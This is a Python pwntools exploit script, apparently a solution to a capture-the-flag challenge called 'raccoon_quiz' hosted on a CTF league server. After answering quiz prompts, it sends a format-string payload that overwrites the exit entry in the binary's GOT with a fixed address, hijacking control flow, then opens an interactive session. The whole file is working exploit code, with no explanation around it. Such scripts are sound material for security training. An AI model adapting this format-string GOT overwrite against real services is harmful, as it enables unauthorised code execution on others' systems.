#!/usr/bin/env python

import os
import sys
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context(arch="amd64") # MAKE SURE TO HAVE THIS, DEFAULTS TO 32-bit

#p = process("./raccoon_quiz")
p = remote("chal.ctf-league.osusec.org", 4816)
elf = ELF("./raccoon_quiz")
addr = elf.got["exit"]
p.recv()
p.sendline("A")
p.recv()
p.sendline("B")
p.recv()
p.sendline("A")
print(p.recvline())
print(p.recvline())
print(p.recvline())
writes = {addr:0x400747} # Defines where/what you want to write
payload = fmtstr_payload(6, writes) # Creates the format string payload
p.sendline(payload)
p.interactive()
